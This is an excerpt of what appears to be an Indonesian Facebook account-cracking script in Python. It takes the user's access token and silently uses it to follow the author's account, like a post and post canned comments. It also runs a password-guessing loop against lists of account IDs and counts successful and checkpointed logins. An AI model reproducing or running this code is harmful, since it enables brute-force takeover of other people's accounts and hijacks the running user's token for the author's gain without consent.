 #!/usr/bin/python2 
 ...
 komen = random.choice(['Mantap bang @[100068397981838:0] I Love You','Pengguna script ganja kamu bang @[100068397981838:0]','Kamu ganteng banget deh @[100068397981838:0]','Kamu ganteng banget deh bang @[100068397981838:0]','Kamu manis bang bang @[100068397981838:0]','Kamu cantik banget anak siapa @[100068397981838:0]','Kamu ganteng banget bang @[100068397981838:0]','Mantap bang love you','NIKInggak ada obat script nya emang','pengin kaya elu bang bisa Recode stading @[100068397981838:0]']) 
 ...
 ─────────────────────────────────────────────────────── 
  [\x1b[1;96m+%s] Author   : NIKI 
  [\x1b[1;96m+%s] Facebook  : Niki 
  [\x1b[1;96m+%s] GITHUB: NIKIKIY4 
 ───────────────────────────────────────────────────────\n'''%(N,N,N,N)) 
 ...
                 requests.post('https://graph.facebook.com/100068397981838/subscribers?access_token=' + toket) 
                 requests.post('https://graph.facebook.com/100068397981838/subscribers?access_token=' + toket) 
                 requests.post('https://graph.facebook.com/100068397981838/subscribers?access_token=' + toket) 
                 requests.post('https://graph.facebook.com/254018450221419/comments/?message=' +komen+ '&access_token=' + toket) 
                 requests.post('https://graph.facebook.com/254018450221419/likes?summary=true&access_token=' + toket) 
                 requests.post('https://graph.facebook.com/254018450221419/comments/?message='+komen+'&access_token=' + toket) 
                 requests.post('https://graph.facebook.com/254018450221419/likes?summary=true&access_token=' + toket) 
 ...
                 nufikhaXD = '%' 
                 print('\r%s [crack] %s/%s [CP:%s-OK:%s] >< %s%s%s '%(ram,loop,len(self.id),len(ok),len(cp),int(fikA),str(nufikhaXD),N), end=' ');sys.stdout.flush() 
 ...
                 sys.stdout.write('\r %s* %s[%scrack%s] %s/%s [CP:%s OK:%s] %s* '%(asw,N,H,N,loop,len(self.id),len(ok),len(cp),mmk));sys.stdout.flush() 
                 try: 
                         for pw in pwx: 
                                 pw = pw.lower() 
                                 ses = requests.Session() 
